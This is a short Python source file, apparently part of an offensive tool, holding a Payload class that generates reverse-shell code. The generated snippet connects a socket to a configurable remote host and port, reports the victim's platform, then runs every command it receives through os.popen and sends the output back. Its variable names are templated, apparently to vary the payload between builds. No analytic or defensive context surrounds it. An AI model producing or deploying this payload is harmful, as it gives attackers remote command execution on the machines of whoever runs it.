class Payload:
    def __init__(self, host: str, port: int, strs: list):
        self.host, self.port, self.strs = host, port, strs

    def create(self):
        return f"""
{self.strs[0]} = False
while not {self.strs[0]}:\n\ttry:\n\t\tconn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
\t\tconn.connect(('{self.host}', int({self.port})))
\t\t{self.strs[0]} = True
\texcept:\n\t\t{self.strs[0]} = False\n\telse:\n\t\tconn.send((sys.platform).encode("UTF-8"))
while {self.strs[0]}:\n\t\ttry:
\t\t\tconn.send(os.popen(conn.recv(1024).decode("UTF-8")).read().encode("UTF-8"))\n\t\texcept:\n\t\t\t{self.strs[0]} = False
"""
